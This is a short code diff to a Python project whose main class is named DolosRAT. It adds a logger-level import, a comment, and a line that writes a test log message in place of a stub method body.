@@ -19,7 +19,7 @@ from typing import Any, Dict, Union
 # Modules.
 from config.config import Config
 from config.logger import get_logger_conf
-from utils.logger import LoggerWrapper, get_logger
+from utils.logger import LoggerWrapper, LoggerLevel, get_logger
 
 (__appname__,
  __author__,
@@ -89,6 +89,7 @@ class DolosRAT:
         Creates a handle to the class exposing methods
         to write application logs, etc.
         """
+        # Create handle to LoggerWrapper.
         self._logger = get_logger(
             __name__, self._config['logger_conf']
         )
@@ -107,7 +108,7 @@ class DolosRAT:
         With handles created for the classes pertinent
         to the application, use these to commence DolosRAT.
         """
-        ...
+        self._logger.write_log("test", LoggerLevel.INFO)
 
     def start(self: object) -> None:
         """Exposed method for 'starting' DolosRAT.
